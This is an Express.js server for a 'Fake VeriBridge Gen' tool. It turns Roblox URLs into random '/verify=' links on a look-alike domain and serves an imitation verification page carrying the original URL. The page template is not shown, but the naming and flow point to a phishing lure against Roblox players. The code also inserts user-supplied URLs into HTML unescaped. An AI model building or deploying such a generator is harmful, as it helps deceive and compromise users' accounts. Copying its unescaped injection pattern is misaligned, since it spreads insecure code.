const express = require('express');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000;

// Configuration
const CONFIG = {
    baseDomain: process.env.BASE_URL || 'https://fake-veribridge-gen.vercel.app',
};

// Serve static files
app.use(express.static('public'));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Main generator page
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// API endpoint to generate random verify link
app.post('/api/generate', (req, res) => {
    const { url } = req.body;
    
    if (!url) {
        return res.status(400).json({ error: 'No URL provided', success: false });
    }
    
    // Validate it's a Roblox URL
    if (!url.includes('roblox.com')) {
        return res.status(400).json({ error: 'Please enter a valid Roblox URL', success: false });
    }
    
    // Generate 12 random digits
    const randomNumbers = Math.floor(100000000000 + Math.random() * 900000000000).toString();
    const generatedLink = `${CONFIG.baseDomain}/verify=${randomNumbers}`;
    
    // Store the mapping (in memory - for production, use a database like Vercel KV)
    // For demo, we'll store in a Map (resets on server restart)
    if (!global.verifyLinks) {
        global.verifyLinks = new Map();
    }
    global.verifyLinks.set(randomNumbers, {
        originalUrl: url,
        createdAt: Date.now()
    });
    
    res.json({
        success: true,
        originalUrl: url,
        generatedUrl: generatedLink,
        verifyCode: randomNumbers
    });
});

// Dynamic route for /verify=XXXXXXXXXXXX
app.get('/verify=:code', (req, res) => {
    const code = req.params.code;
    
    // Check if this verification code exists
    const linkData = global.verifyLinks?.get(code);
    
    // Read the VeriBridge HTML template
    const fs = require('fs');
    let html = fs.readFileSync(path.join(__dirname, 'public', 'verify.html'), 'utf8');
    
    // Inject the original URL and code into the page (for the verification flow)
    html = html.replace('{{VERIFY_CODE}}', code);
    html = html.replace('{{ORIGINAL_URL}}', linkData?.originalUrl || 'https://www.roblox.com');
    html = html.replace('{{CURRENT_DOMAIN}}', CONFIG.baseDomain);
    
    res.setHeader('Content-Type', 'text/html');
    res.send(html);
});

// API to get link data (for the verification page)
app.get('/api/link/:code', (req, res) => {
    const code = req.params.code;
    const linkData = global.verifyLinks?.get(code);
    
    if (linkData) {
        res.json({ success: true, ...linkData });
    } else {
        res.json({ success: false, error: 'Invalid verification link' });
    }
});

// Start server
if (require.main === module) {
    app.listen(PORT, () => {
        console.log(`Fake VeriBridge Gen running on http://localhost:${PORT}`);
        console.log(`Example generated link: ${CONFIG.baseDomain}/verify=123456789012`);
    });
}

module.exports = app;
